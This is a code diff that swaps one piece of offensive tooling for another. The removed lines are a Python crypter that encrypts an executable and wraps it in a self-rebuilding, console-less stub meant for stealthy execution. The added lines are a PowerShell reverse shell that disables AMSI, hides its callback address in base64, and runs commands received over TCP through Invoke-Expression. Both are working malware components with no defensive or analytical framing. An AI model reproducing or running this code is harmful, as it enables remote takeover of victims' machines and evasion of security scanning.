@@ -1,83 +1,43 @@
-import os, base64, zlib, random, string, tempfile, subprocess, sys
+# Randomized dynamic variables
+$vx=("v"+[guid]::NewGuid().ToString("N").Substring(0,6))
+$vy=("x"+(65..90+97..122|Get-Random -Count 6|%{[char]$_}) -join "")
+$vz=("d"+[guid]::NewGuid().ToString("N").Substring(0,8))
 
-# --- auto install Cryptodome if missing ---
-try:
-    from Cryptodome.Cipher import AES
-    from Cryptodome.Util.Padding import pad, unpad
-except ImportError:
-    print("[*] pycryptodome not found, installing...")
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
-    from Cryptodome.Cipher import AES
-    from Cryptodome.Util.Padding import pad, unpad
+# Encrypted config
+$cfg="MTkyLjE2OC4xLjEyMQ=="; # 192.168.1.121 (Base64)
+$pp="ODA5MA=="; # 8090 (Base64)
 
-def random_id(length=12):
-    return ''.join(random.choice(string.ascii_letters) for _ in range(length))
+# AES Engine
+function $vx([byte[]]$c,[byte[]]$k,[byte[]]$iv){
+    $a=[System.Security.Cryptography.Aes]::Create()
+    $a.Key=$k;$a.IV=$iv
+    $d=$a.CreateDecryptor()
+    $ms=New-Object IO.MemoryStream(,$c)
+    $cs=New-Object Security.Cryptography.CryptoStream($ms,$d,'Read')
+    $sr=New-Object IO.StreamReader($cs)
+    $sr.ReadToEnd()
+}
 
-def build_variant(input_exe, output_name):
-    with open(input_exe, "rb") as f:
-        data = f.read()
+# AMSI Kill
+$ams=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$fld=$ams.GetField('amsiInitFailed','NonPublic,Static')
+$fld.SetValue($null,$true)
 
-    compressed = zlib.compress(data, 9)
-    key, iv = os.urandom(32), os.urandom(16)
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    encrypted = cipher.encrypt(pad(compressed, AES.block_size))
+# Polymorphic exec body
+$ip=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cfg))
+$pr=[int][Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($pp))
+$k=[Convert]::FromBase64String("Lk3PbO8Z5nBlzYvQ4U0wGg==")
+$iv=(1..16)|%{0}
 
-    payload = base64.b64encode(encrypted).decode()
-    key_b64 = base64.b64encode(key).decode()
-    iv_b64 = base64.b64encode(iv).decode()
+$cl=New-Object Net.Sockets.TcpClient($ip,$pr)
+$st=$cl.GetStream();$bf=New-Object Byte[] 4096
 
-    func, rebuilder = random_id(), random_id()
+while(($i=$st.Read($bf,0,$bf.Length))-ne 0){
+    $cmd=& $vx $bf[0..($i-1)] $k $iv
+    $res=Invoke-Expression $cmd|Out-String
+    $res+="PS "+(Get-Location).Path+"> "
+    $out=[Text.Encoding]::UTF8.GetBytes($res)
+    $st.Write($out,0,$out.Length);$st.Flush()
+}
 
-    stub = f"""
-import base64, zlib, tempfile, subprocess, os, sys
-from Cryptodome.Cipher import AES
-from Cryptodome.Util.Padding import unpad
-
-def {func}():
-    key = base64.b64decode({key_b64!r})
-    iv = base64.b64decode({iv_b64!r})
-    enc = base64.b64decode({payload!r})
-
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    decrypted = unpad(cipher.decrypt(enc), AES.block_size)
-    exe = zlib.decompress(decrypted)
-
-    tmp = tempfile.mktemp(suffix=".exe")
-    with open(tmp, "wb") as f:
-        f.write(exe)
-    subprocess.Popen(tmp, shell=True)
-
-    {rebuilder}()
-
-def {rebuilder}():
-    import random, string, os, base64, zlib, sys, tempfile, subprocess
-    src = open(sys.argv[0], "r").read()
-    varname = ''.join(random.choice(string.ascii_letters) for _ in range(10))
-    newfile = tempfile.mktemp(suffix=".py")
-    with open(newfile, "w") as f:
-        f.write(src.replace("PLACEHOLDER", varname))
-    subprocess.call(f"pyinstaller --onefile --noconsole {{newfile}}", shell=True)
-
-{func}()
-"""
-
-    pyfile = output_name + ".py"
-    with open(pyfile, "w") as f:
-        f.write(stub)
-
-    subprocess.call(f"pyinstaller --onefile --noconsole {pyfile}", shell=True)
-
-    os.remove(pyfile)
-    try:
-        os.remove(output_name + ".spec")
-    except:
-        pass
-
-if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Usage: python3 builder.py <payload.exe>")
-        sys.exit(1)
-
-    input_exe = sys.argv[1]
-    outname = os.path.splitext(os.path.basename(input_exe))[0] + "_stealth"
-    build_variant(input_exe, outname)
+$cl.Close()
